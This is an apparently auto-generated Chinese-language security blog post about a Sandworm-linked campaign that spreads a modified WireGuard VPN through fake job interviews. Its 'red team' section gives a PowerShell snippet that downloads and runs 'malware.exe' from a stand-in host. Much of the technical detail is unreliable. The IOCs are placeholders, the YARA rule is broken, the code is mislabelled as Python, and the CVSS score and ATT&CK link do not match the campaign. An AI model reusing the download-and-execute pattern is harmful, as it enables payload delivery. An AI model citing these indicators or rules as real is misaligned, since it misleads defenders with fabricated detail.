---
layout: post
title:  "Sandworm-Linked UAC-0145 Uses Fake Job Interviews to Push VPN That Can Run Commands"
date:   2026-08-11 18:52:17 +0000
categories: [security]
severity: critical
---

# 🚨 解析俄羅斯國家級威脅演員的社會工程學攻擊：利用假招聘活動傳播惡意軟件

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: 社會工程學、WireGuard、PowerShell

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用假招聘活動，通過社交工程學手段，讓受害者下載並安裝惡意軟件。惡意軟件是基於WireGuard的源代碼修改而成，添加了非標準的"SymmetricKey"選項，允許攻擊者在受害者主機上執行任意命令。
* **攻擊流程圖解**:
  1. 攻擊者創建假招聘活動，通過社交媒體或職業網站聯繫受害者。
  2. 攻擊者與受害者進行初步溝通，討論工作相關問題和英語水平。
  3. 攻擊者邀請受害者參加Zoom視頻會議，會議中可能出現真人或合成人物。
  4. 攻擊者發送電子郵件，包含配置文件和連結，要求受害者下載並安裝惡意軟件。
* **受影響元件**: WireGuard、PowerShell、Windows、Linux

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者的聯繫信息和信任。
* **Payload 建構邏輯**:

    ```
    
    python
    # 惡意軟件的 PowerShell 腳本
    $script = @"
      # 下載並執行惡意軟件
      Invoke-WebRequest -Uri 'https://example.com/malware.exe' -OutFile 'C:\malware.exe'
      Start-Process -FilePath 'C:\malware.exe'
    "@
    # 執行腳本
    Invoke-Expression -Command $script
    
    ```
* **繞過技術**: 攻擊者可以使用社交工程學手段，讓受害者繞過安全軟件的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | example.com |
| File Path | C:\malware.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Malware_Detection {
      meta:
        description = "偵測惡意軟件"
      strings:
        $a = "malware.exe"
      condition:
        $a at pe.entry_point
    }
    
    ```
* **緩解措施**: 更新WireGuard和PowerShell，啟用安全軟件的實時保護，限制受害者下載和執行未知軟件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **社會工程學 (Social Engineering)**: 一種攻擊手段，利用人類心理和行為的弱點，讓受害者泄露敏感信息或執行惡意動作。
* **WireGuard**: 一種開源的VPN軟件，提供安全的網路連接。
* **PowerShell**: 一種命令列 shell 和腳本語言，提供強大的自動化和管理功能。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/sandworm-linked-uac-0145-uses-fake-job.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


